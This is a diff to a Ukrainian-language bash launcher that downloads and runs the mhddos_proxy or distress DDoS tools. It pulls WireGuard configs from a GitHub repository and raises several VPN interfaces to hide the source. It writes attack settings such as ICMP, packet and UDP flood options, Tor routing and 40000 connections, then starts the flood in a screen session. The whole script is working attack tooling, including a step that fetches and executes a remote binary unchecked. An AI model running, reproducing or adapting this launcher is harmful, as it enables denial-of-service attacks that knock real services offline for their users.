@@ -42,32 +42,21 @@ ask_run_parameters() {
     esac
 }
 
-# Завантаження або введення налаштувань
-if [ -f "$SETTINGS_FILE" ]; then
+[ -f "$SETTINGS_FILE" ] && {
     echo "1) Використати старі налаштування"
     echo "2) Ввести нові"
     read -p "Ваш вибір (1/2): " choice
     [ "$choice" = "1" ] && source "$SETTINGS_FILE" || { USER_ID=""; SELECTED_MODULE=""; EDIT_INI=""; SELECTED_RUN_MODE=""; }
-fi
+}
 
-# USER-ID
-if [ -z "$USER_ID" ]; then
-    while true; do
-        ask_user_id
-        [[ -z "$USER_ID" ]] && echo "User-id обов'язковий. Завершення." && exit 1
-        [[ "$USER_ID" =~ ^[0-9]+$ ]] && break || echo "USER-ID має містити тільки цифри!"
-    done
-fi
-
-# Інші параметри
+[ -z "$USER_ID" ] && ask_user_id
 [ -z "$SELECTED_MODULE" ] || [ -z "$EDIT_INI" ] || [ -z "$SELECTED_RUN_MODE" ] && ask_run_parameters
 
 print_header
-echo -e "📥  USER-ID: \e[1;32m$USER_ID\e[0m"
-echo -e "🧩  Модуль: \e[1;36m$SELECTED_MODULE\e[0m"
+echo -e "📅  USER-ID: \e[1;32m$USER_ID\e[0m"
+echo -e "🧰  Модуль: \e[1;36m$SELECTED_MODULE\e[0m"
 echo -e "🛠️  Режим: \e[1;36m$SELECTED_RUN_MODE\e[0m"
 
-# Збереження
 cat > "$SETTINGS_FILE" <<EOF
 USER_ID="$USER_ID"
 SELECTED_MODULE="$SELECTED_MODULE"
@@ -75,37 +64,27 @@ EDIT_INI="$EDIT_INI"
 SELECTED_RUN_MODE="$SELECTED_RUN_MODE"
 EOF
 
-# sudo
 [ "$(id -u)" -eq 0 ] && SUDO="" || SUDO="sudo"
 
-# Встановлення залежностей
-print_stage "📦  Встановлення залежностей..."
-
-INSTALL_PKGS="curl wget git screen sed wireguard-tools iproute2 nano"
-if command -v apt >/dev/null; then
-    $SUDO apt update -y && $SUDO apt install -y $INSTALL_PKGS
-elif command -v dnf >/dev/null; then
-    $SUDO dnf install -y $INSTALL_PKGS
-elif command -v yum >/dev/null; then
-    $SUDO yum install -y $INSTALL_PKGS
-elif command -v apk >/dev/null; then
-    $SUDO apk add --no-cache $INSTALL_PKGS
-elif command -v pacman >/dev/null; then
-    $SUDO pacman -Sy --noconfirm $INSTALL_PKGS
-elif command -v zypper >/dev/null; then
-    $SUDO zypper install -y $INSTALL_PKGS
+# === Автоматичне визначення шляху до wg_confs ===
+if [ -d "$PWD/wg_confs" ]; then
+  WG_DIR="$PWD/wg_confs"
+elif [ -d "$HOME/wg_confs" ]; then
+  WG_DIR="$HOME/wg_confs"
+elif [ -d "/etc/wireguard/wg_confs" ]; then
+  WG_DIR="/etc/wireguard/wg_confs"
 else
-    echo "❌ Невідомий пакетний менеджер"
-    exit 1
+  echo "❌ Не знайдено папку wg_confs. Створюю в \$HOME"
+  WG_DIR="$HOME/wg_confs"
+  mkdir -p "$WG_DIR"
 fi
 
-# Папки
+echo "📂 Поточна папка WG: $WG_DIR"
+
 MODULE_DIR="$HOME/modules"
-WG_DIR="$HOME/wg_confs"
-mkdir -p "$MODULE_DIR" "$WG_DIR"
+mkdir -p "$MODULE_DIR"
 touch "$MODULE_DIR/mhddos.ini" "$MODULE_DIR/distress.ini"
 
-# Вибір модуля
 case "$SELECTED_MODULE" in
     mhddos_proxy)
         MODULE="$MODULE_DIR/mhddos_proxy"
@@ -124,74 +103,91 @@ esac
 [ -f "$MODULE" ] || wget -qO "$MODULE" "$DOWNLOAD_LINK"
 chmod +x "$MODULE"
 
-# Завантаження WG-конфігів
 print_stage "🌍  Завантаження WG-конфігів..."
 
 WG_REPO_HTML="https://github.com/k7771/Kaljan747/tree/k7771/wg"
 WG_RAW_BASE="https://raw.githubusercontent.com/k7771/Kaljan747/k7771/wg"
 
-CONF_LIST=$(curl -fsSL "$WG_REPO_HTML" | grep -oP '(?<=href=")[^"]+\.conf(?=")' | grep "/k7771/Kaljan747/blob/" | sed -E 's|^/k7771/Kaljan747/blob/k7771/wg/||')
+CONF_LIST_GITHUB=$(curl -fsSL "$WG_REPO_HTML" | grep -oP '(?<=href=")[^"]+\.conf(?=")' | grep "/k7771/Kaljan747/blob/" | sed -E 's|^/k7771/Kaljan747/blob/k7771/wg/||')
 
-if [ -z "$CONF_LIST" ]; then
-    echo "⚠️ Не вдалося отримати список .conf з GitHub. Перевіряю локальну папку..."
-    CONF_LIST=$(find "$WG_DIR" -name "*.conf" -type f)
-    if [ -z "$CONF_LIST" ]; then
-        echo "❌ Жодного .conf файлу не знайдено навіть локально. Завершення."
-        exit 1
-    else
-        echo "✅ Використано локальні файли: $(basename -a $CONF_LIST | tr '\n' ' ')"
-    fi
-else
-    for file in $CONF_LIST; do
+if [ -n "$CONF_LIST_GITHUB" ]; then
+    echo "🌐 Завантаження з GitHub:"
+    for file in $CONF_LIST_GITHUB; do
         RAW_URL="$WG_RAW_BASE/$file"
         DEST="$WG_DIR/$(basename "$file")"
         if ! curl -fsSL "$RAW_URL" -o "$DEST"; then
-            echo "⚠️ curl не спрацював — пробую wget"
-            wget -qO "$DEST" "$RAW_URL" || echo "❌ Не вдалося: $file"
+            echo "⚠️ curl не спрацював — пробую wget..."
+            wget -qO "$DEST" "$RAW_URL" || echo "❌ Не вдалося завантажити $file"
+        else
+            echo "✅ Завантажено: $file"
         fi
     done
+else
+    echo "⚠️ Не вдалося отримати список .conf з GitHub — пропускаємо GitHub"
+fi
+
+CONF_LIST_LOCAL=$(find "$WG_DIR" -name "*.conf" -type f)
+
+if [ -z "$CONF_LIST_LOCAL" ]; then
+    echo "❌ Жодного .conf не знайдено навіть локально. Завершення."
+    exit 1
+else
+    echo "📂 Локальні .conf файли: $(basename -a $CONF_LIST_LOCAL | tr '\n' ' ')"
 fi
 
 $SUDO chmod 600 "$WG_DIR"/*.conf 2>/dev/null || true
 
-# Зупинка WG
 for iface in $(wg show interfaces 2>/dev/null); do
     $SUDO wg-quick down "$iface" || true
     $SUDO ip link delete "$iface" || true
 done
 
-# Підключення WG
 WG_FILES=($(find "$WG_DIR" -name "*.conf" -type f | shuf | head -n 10))
 WG_IFACES=()
+SUCCESS=0
+FAIL=0
+
+echo -e "\n🔧 Перевірка та підняття WG-інтерфейсів:"
+
 for conf in "${WG_FILES[@]}"; do
     IFACE_NAME=$(basename "$conf" .conf)
-    if $SUDO wg-quick up "$conf" 2>/dev/null; then
-        if wg show "$IFACE_NAME" &>/dev/null; then
+    echo -e "\n📄 $IFACE_NAME:"
+
+    if ! grep -q "PrivateKey" "$conf"; then echo "❌ Відсутній PrivateKey"; ((FAIL++)); continue; fi
+    if ! grep -q "Endpoint" "$conf"; then echo "❌ Відсутній Endpoint"; ((FAIL++)); continue; fi
+
+    if $SUDO wg-quick up "$conf" 2> >(tee /tmp/wg_error.log >&2); then
+        if $SUDO wg show "$IFACE_NAME" &>/dev/null; then
             WG_IFACES+=("$IFACE_NAME")
-            echo "✅ Піднято: $IFACE_NAME"
+            echo "✅ Інтерфейс $IFACE_NAME піднято"
+            $SUDO wg show "$IFACE_NAME"
+            ((SUCCESS++))
         else
-            echo "⚠️ Неактивний інтерфейс: $IFACE_NAME"
+            echo "⚠️ Неактивний $IFACE_NAME"
+            ((FAIL++))
         fi
     else
-        echo "❌ Не вдалося: $IFACE_NAME"
+        echo "❌ Помилка $IFACE_NAME:"
+        cat /tmp/wg_error.log
+        ((FAIL++))
     fi
     sleep 1
 done
 
-[ ${#WG_IFACES[@]} -eq 0 ] && echo "❌ Жоден WG не піднявся. Завершення." && exit 1
+rm -f /tmp/wg_error.log
+
+echo -e "\n📊 Результат: Успішно: $SUCCESS | Помилок: $FAIL"
+
+[ ${#WG_IFACES[@]} -eq 0 ] && echo "❌ Нічого не піднялось. Вихід." && exit 1
 
 VPN_LIST=$(IFS=' '; echo "${WG_IFACES[*]}")
 VPN_LIST_COMMAS=$(IFS=','; echo "${WG_IFACES[*]}")
-echo -e "📡 Активні VPN: \e[1;36m$VPN_LIST\e[0m"
 
-# Оновлення INI
 echo "--use-my-ip 0 --copies 4 -t 12000 --ifaces $VPN_LIST --user-id=$USER_ID" > "$MODULE_DIR/mhddos.ini"
 echo "--use-my-ip 0 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --use-tor 30 --disable-auto-update -c 40000 --interface=$VPN_LIST_COMMAS --user-id=$USER_ID" > "$MODULE_DIR/distress.ini"
 
-# Редагування INI
 [ "$EDIT_INI" = "Так" ] && nano "$CONFIG_FILE"
 
-# Запуск
 case "$SELECTED_RUN_MODE" in
     "screen у фоні") screen -dmS "$MODULE_NAME" "$MODULE" $(cat "$CONFIG_FILE") ;;
     "screen відкрито") screen -S "$MODULE_NAME" "$MODULE" $(cat "$CONFIG_FILE") ;;
